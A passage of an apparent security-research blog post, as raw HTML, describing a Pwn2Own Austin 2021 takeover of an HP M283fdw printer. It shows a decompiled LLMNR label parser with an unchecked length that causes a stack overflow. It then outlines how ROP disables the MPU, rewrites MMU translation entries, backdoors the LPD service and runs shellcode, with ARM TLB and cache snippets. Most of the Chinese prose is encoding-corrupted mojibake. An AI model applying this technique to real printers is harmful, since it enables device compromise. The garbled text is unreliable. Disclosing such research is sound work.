  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r6&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// cc&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r6&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;chr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------------[1]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC0u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;.&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//----------[2]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;è€Œåœ¨ consume_labels ä¸­çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt; æœƒå…ˆå–å¾— label é•·åº¦ï¼Œæ¥è‘—æ ¹æ“šå‹æ…‹å»è™•ç†ï¼Œè€Œåœ¨&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt; å‰‡æ˜¯è™•ç†ä¸€èˆ¬é•·åº¦çš„æƒ…æ³ï¼Œæ­¤è™•ä¸¦&lt;strong&gt;æ²’æœ‰å°é•·åº¦åšæª¢æŸ¥&lt;/strong&gt;ï¼Œå°±ç›´æ¥å°‡ label å¯«é€² dst buffer ä¸­ï¼Œå°è‡´äº† stack overflowï¼Œåˆ°æ­¤è™•æˆ‘å€‘åŸä»¥ç‚ºå·®ä¸å¤šçµæŸäº†ï¼Œæ¥ä¸‹ä¾†æ‡‰è©²å¦‚åŒ Canon é¡ä¼¼çš„æ–¹æ³•å°±å¯ä»¥ Exploit äº†ã€‚ç„¶è€Œç•¶æˆ‘å€‘åœ¨å¯« Exploit æ™‚ç™¼ç¾ HP æ¯” Canon å¤šäº†ä¸€äº›ä¿è­·æ©Ÿåˆ¶ã€‚&lt;/p&gt;

&lt;h4 id=&quot;protection-1&quot;&gt;Protection&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;No Stack Guard&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;XN(DEP)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Memory Protect Unit (MPU)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;No ASLR&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;åœ¨ HP å°è¡¨æ©Ÿä¸­ï¼Œå¤šäº† XN åŠ MPU çš„è¨˜æ†¶é«”ä¿è­·æªæ–½ï¼Œå¦å¤–é€™å€‹æ¼æ´ä¹Ÿæœ‰äº†æ›´å¤šçš„é™åˆ¶ã€‚æˆ‘å€‘&lt;strong&gt;åªèƒ½ overflow ç´„ 0x100 bytes&lt;/strong&gt; åŠ&lt;strong&gt;ä¸èƒ½æœ‰ null å­—å…ƒ&lt;/strong&gt;ï¼Œé€™å¤§å¹…é™åˆ¶äº†æˆ‘å€‘çš„ ROPï¼Œä½¿å¾—æˆ‘å€‘æ²’è¾¦æ³•å–®é  ROP åšåˆ°å¾ŒçºŒè¡Œå‹•ï¼Œéœ€è¦å¦å¤–æ‰¾å…¶ä»–çš„æ¼æ´æˆ–å…¶ä»–æ–¹æ³•æ‰èƒ½é”æˆæˆ‘å€‘çš„ç›®æ¨™ã€‚åœ¨ä¸€æ®µæ™‚é–“å¾Œï¼Œæˆ‘å€‘é–‹å§‹æ€è€ƒï¼ŒHP å°è¡¨æ©Ÿæ˜¯å¦‚ä½•å»å¯¦ä½œ &lt;strong&gt;XN(DEP)&lt;/strong&gt; åŠ &lt;strong&gt;MPU&lt;/strong&gt; çš„? æˆ‘å€‘å›é¡§ä¸€ä¸‹ HP RTOS:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;æ‰€æœ‰ Service code åŠ Kernel Code éƒ½åœ¨åŒä¸€å€‹ Binary ä¸­ã€‚&lt;/li&gt;
  &lt;li&gt;å¤§å¤šæ•¸çš„ task éƒ½è·‘åœ¨åŒä¸€å€‹è¨˜æ†¶é«”ç©ºé–“åº•ä¸‹(æ²’æœ‰ Process isolation)ï¼Œä¹Ÿå¹¾ä¹éƒ½è·‘åœ¨é«˜æ¬Šé™æ¨¡å¼&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;çœ‹å®Œä»¥ä¸Šå…©é»ï¼Œæœƒæƒ³åˆ°æ˜¯ä¸æ˜¯ç†è§£ HP RTOS ä¸­çš„ MMU åŠ MPU å°±å¯ä»¥ç¹éå‘¢ï¼Ÿ&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘ä¾†çœ‹ä¸€ä¸‹ HP RTOS MMU æ©Ÿåˆ¶&lt;/p&gt;

&lt;h4 id=&quot;mmu-in-hp-m283fdw&quot;&gt;MMU in HP M283fdw&lt;/h4&gt;
&lt;p&gt;åœ¨ HP M283fdw ä¸­ä½¿ç”¨çš„æ˜¯ä¸€éšå±¤çš„ Translation table ä¾†åš Address translation ï¼Œæ¯å€‹ translation table entry éƒ½è¡¨ç¤º 1MB çš„ Sectionï¼Œè€Œ Translation table å‰‡æ˜¯&lt;strong&gt;å›ºå®šåœ¨ 0x4003c000&lt;/strong&gt; é€™å€‹ä½ç½®ä¸Š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/23.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è€Œæ¯å€‹ translation table entry éƒ½æœƒå°æ‡‰åˆ° physical address åŠè©² section çš„æ¬Šé™ï¼ŒCPU å°±æ˜¯æ ¹æ“šé€™äº›å…§å®¹æ±ºå®šåŸ·è¡Œæ¬Šé™ã€è¨˜æ†¶é«”å…§å®¹ä¿®æ”¹æ¬Šé™ï¼Œå¦‚æœæˆ‘å€‘å¯ä»¥ä¿®æ”¹ translation table entry çš„å…§å®¹å°±å¯ä»¥æ›´æ”¹è¨˜æ†¶é«”æ¬Šé™ï¼Œä¹Ÿå¯ä»¥é€éå®ƒä¾† Mapping ä»»æ„ Physical addressï¼Œé€™é‚Šè·Ÿæ¬Šé™æœ‰é—œçš„ä¸»è¦æœƒæœ‰ AP APX è·Ÿ XNã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/24.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å¯ä»¥å¾å‰è¿°çš„æ¼æ´ä¸­æ³¨æ„åˆ°ï¼Œåœ¨æœ‰ stack overflow ä¸”ä¹Ÿè·‘åœ¨é«˜æ¬Šé™ä¸‹ï¼Œå°±å¯é€šé ROP ä¿®æ”¹ translation table entryï¼Œä½†ç•¶æˆ‘å€‘å°å˜—è©¦ç›´æ¥å° translation table åšå¯«å…¥å¾Œï¼Œçµæœ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/25.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€ æˆå°è¡¨æ©Ÿ Crashï¼ŒæŸ¥äº†ä¸€ä¸‹ç™¼ç¾æ˜¯ memory fault exceptionï¼Œä¸»è¦é€ æˆåŸå› å°±æ˜¯å› ç‚º Memory Protect Unit (MPU) æœ‰å°è©²è¨˜æ†¶é«”å€æ®µåšä¿è­·ã€‚&lt;/p&gt;

&lt;p&gt;å¥½ï¼Œé‚£æˆ‘å€‘å°±ä¾†çœ‹çœ‹ MPU çš„æ©Ÿåˆ¶ã€‚&lt;/p&gt;

&lt;h4 id=&quot;mpu-in-hp-m283fdw&quot;&gt;MPU in HP M283fdw&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Memory_protection_unit&quot;&gt;MPU&lt;/a&gt; ä¸»è¦åŠŸèƒ½æ˜¯æŠŠ memory æ‹†åˆ†æˆå¥½å¹¾å€‹ region ä¸¦å®šç¾©æ¯å€‹ region çš„æ¬Šé™ï¼Œèˆ‡ MMU æ˜¯å®Œå…¨ä¸åŒçš„æ©Ÿåˆ¶ï¼Œå¾ˆå¸¸å‡ºç¾åœ¨ IoT è¨­å‚™ä¸­ã€‚
HP å‰‡æ˜¯åœ¨é–‹æ©Ÿå°±æœƒå•Ÿç”¨ï¼Œä¸¦å°‡æ¯å€‹ region å®šç¾©å¥½æ¬Šé™ï¼Œå› æ­¤ç„¡æ³•è‡ªå·±æ“ä½œ page tableã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/26.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨é•·æ™‚é–“é€†å‘åŠåƒè€ƒ &lt;a href=&quot;https://developer.arm.com/documentation/ddi0403/d/System-Level-Architecture/System-Address-Map/Protected-Memory-System-Architecture--PMSAv7/Register-support-for-PMSAv7-in-the-SCS?lang=en#BEHJFJDI&quot;&gt;ARM Manual&lt;/a&gt; ä¹‹å¾Œï¼Œæˆ‘å€‘ç™¼ç¾äº‹å¯¦ä¸Šåªè¦æ¸…ç©º MPU_CTRL å°±å¯é—œé–‰ MPUï¼Œåœ¨ç¶“éé€†å‘å¾Œ HP M283fdw çš„ MPU_CTRL ä½ç½®æ˜¯åœ¨ 0xE0400304ï¼Œé€™é‚Šç¨å¾®è·Ÿ ARM çš„ spec æœ‰é»ä¸åŒï¼Œä¸å¤ªç¢ºå®šåŸå› å°±æ˜¯äº†ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/27.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h4&gt;
&lt;p&gt;åœ¨äº†è§£ HP çš„ MMU åŠ MPU æ©Ÿåˆ¶å¾Œï¼Œæˆ‘å€‘å¯è¼•æ˜“åœ°åˆ©ç”¨ ROP ä¾†é—œé–‰ MPUï¼Œä¸¦æˆåŠŸä¿®æ”¹ translation table entryï¼Œæˆ‘å€‘å¯ä»¥ä»»æ„çš„ä¿®æ”¹ä»»ä½• serivce çš„ç¨‹å¼ç¢¼ï¼Œé€™é‚Šæˆ‘å€‘æœ€å¾Œé¸æ“‡äº† &lt;a href=&quot;https://en.wikipedia.org/wiki/Line_Printer_Daemon_protocol&quot;&gt;Line Printer Daemon(LPD)&lt;/a&gt; é€™å€‹æœå‹™ä¾†ä¿®æ”¹ï¼Œå°‡å®ƒä¿®æ”¹æˆå¾Œé–€: è®€å…¥æ›´å¤šçš„ Payload åˆ°æŒ‡å®šçš„ä½ç½®ä¸Šï¼Œæœ€çµ‚åŸ·è¡Œæˆ‘å€‘é€éå»çš„ shellcodeã€‚&lt;/p&gt;

&lt;p&gt;ä½†æœ‰ä¸€é»å¿…é ˆç‰¹åˆ¥æ³¨æ„ï¼Œè¦†è“‹å®Œ translation table entry è·Ÿ LPD çš„ code å¾Œï¼Œå‹™å¿…è¦ &lt;strong&gt;flush TLB&lt;/strong&gt; è·Ÿ&lt;strong&gt;æ¸…æ‰ I-cache å’Œ D-cache&lt;/strong&gt;  ä¸ç„¶å¾ˆæœ‰å¯èƒ½é‚„æ˜¯è·‘åœ¨èˆŠæœ‰çš„ç¨‹å¼ç¢¼ä¸Šé¢å°è‡´ exploit å¤±æ•—ã€‚&lt;/p&gt;

&lt;p&gt;Flush TLB&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;flush_tlb:
    mov r12, #0
    mcr p15, 0, r12, c8, c7, 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Invalidate I-cache&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;disable_icache:
    mrc p15, 0, r1, c1, c0, 0
    bic r1, r1, #(1 &amp;lt;&amp;lt; 12)
    mcr p15, 0, r1, c1, c0, 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æˆ‘å€‘é‡æ–°æ•´ç†äº†ä¸€ä¸‹åˆ©ç”¨æ­¥é©Ÿ&lt;/p&gt;

&lt;h4 id=&quot;exploitation-step-1&quot;&gt;Exploitation Step&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;é¦–å…ˆå…ˆè§¸ç™¼ LLMNR çš„ stack overflow&lt;/li&gt;
  &lt;li&gt;åˆ©ç”¨æœ‰é™çš„ ROP é—œé–‰ MPU&lt;/li&gt;
  &lt;li&gt;åˆ©ç”¨ ROP æ”¹æ‰ translation table entry ç²å¾—è®€å¯«åŸ·è¡Œæ¬Šé™&lt;/li&gt;
  &lt;li&gt;Flush TLB&lt;/li&gt;
  &lt;li&gt;æ”¹æ‰ LPD service çš„ç¨‹å¼ç¢¼&lt;/li&gt;
  &lt;li&gt;æ¸…æ‰ I-cache å’Œ D-cache&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨æ”¹éçš„ LPD è®€æˆ‘å€‘çš„ shellcode å¾Œä¸¦åŸ·è¡Œ&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;pwn2own-austin-2021-2&quot;&gt;Pwn2Own Austin 2021&lt;/h4&gt;
&lt;p&gt;åˆ°å¯ä»¥åŸ·è¡Œ shellcode æ™‚ï¼Œæˆ‘å€‘åªå‰©ä¸€é€±æ™‚é–“ï¼Œæˆ‘å€‘æœ€å¾Œé¸æ“‡è·Ÿ Canon ä¸€æ¨£ä½¿ç”¨æ”¹å­—ä¸²é¡¯ç¤º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pwned by DEVCORE&lt;/code&gt; åˆ° LCD ä¸Šã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/28.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è€Œå¹¸é‹çš„æ˜¯ï¼Œæˆ‘å€‘ç¬¬ä¸€æ¬¡å˜—è©¦å°±æˆåŠŸäº†ï¼šï¼‰&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/vQbQImZ3XRw?start=29093&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;åœ¨é€™ä¹‹å¾Œæˆ‘å€‘ä¹Ÿå˜—è©¦äº†ç›´æ¥æŠŠå¾Œé–€æ”¹æˆ debug console ä¸Šé¢ï¼Œæ–¹ä¾¿åˆ©ç”¨è¨±å¤šåŠŸèƒ½ï¼Œä¾‹å¦‚æŸ¥çœ‹è¨˜æ†¶é«”è³‡è¨Šï¼Œæ’­æ”¾éŸ³æ¨‚ç­‰ç­‰åŠŸèƒ½ï¼Œ&lt;a href=&quot;https://twitter.com/fsecurelabs&quot;&gt;F-Secure Labs&lt;/a&gt; åœ¨æ¯”è³½æ™‚å°±ä½¿ç”¨æ’­æ”¾éŸ³æ¨‚é€™å€‹åŠŸèƒ½ä¾†å‘ˆç¾ï¼Œéå¸¸æœ‰è¶£ï¼Œå¯ä»¥åˆ°&lt;a href=&quot;https://youtu.be/c82uFBdTvII?t=1263&quot;&gt;é€™è£¡&lt;/a&gt;çœ‹ç•¶æ™‚çš„æƒ…æ³ã€‚&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/S9TkvaAmyMw&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h3 id=&quot;result&quot;&gt;Result&lt;/h3&gt;
&lt;p&gt;åœ¨ Pwn2Own Austin 2021 ä¸­ï¼Œæˆ‘å€‘æ‰“ä¸‹å…¶ä»–è¨­å‚™è·Ÿå°è¡¨æ©Ÿå¾Œæœ€çµ‚ç²å¾—äº†ç¬¬äºŒåï¼Œä»¥é€™æ¬¡ä¾†èªªç²å¾—ä¸éŒ¯ç¶“é©—ï¼Œä¹Ÿå­¸åˆ°äº†ä¸€äº›æ–°æ±è¥¿ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/29.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è€Œå°æ–¼ä¸€èˆ¬ç”¨æˆ¶å€‘ï¼Œæœ‰ä»€éº¼æ–¹æ³•å¯ä»¥é¿å…å°è¡¨æ©Ÿè¢«ç•¶ä½œæ”»æ“Šç›®æ¨™ç”šè‡³æ˜¯è·³æ¿å‘¢?&lt;/p&gt;

&lt;h2 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h2&gt;
&lt;h3 id=&quot;update&quot;&gt;Update&lt;/h3&gt;

